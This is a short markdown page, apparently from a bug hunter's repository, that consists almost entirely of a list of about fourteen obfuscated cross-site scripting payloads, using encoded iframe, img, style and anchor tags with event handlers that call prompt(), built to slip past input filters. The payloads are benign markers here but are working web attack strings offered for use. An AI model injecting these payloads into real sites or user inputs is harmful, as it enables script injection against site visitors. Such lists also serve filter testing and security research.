### XSS By xtyphonx


##### PoC : 

stored xss PoC


#### XSS Payload List :

```
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : https://hackerone.com/xtyphonx -->


<iframe %00 src="&Tab;javascript:prompt(document.domain)&Tab;"%00>
<ScRipT 5-0*3+9/3=>prompt(2)</ScRipT giveanswerhere=?
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(3)>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(4)
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(5) /*iframe/src*/>
<a/href="javascript:&#13; javascript:prompt(6)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(7)
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(8)">
<var onmouseover="prompt(9)">On Mouse Over</var>




#### References :


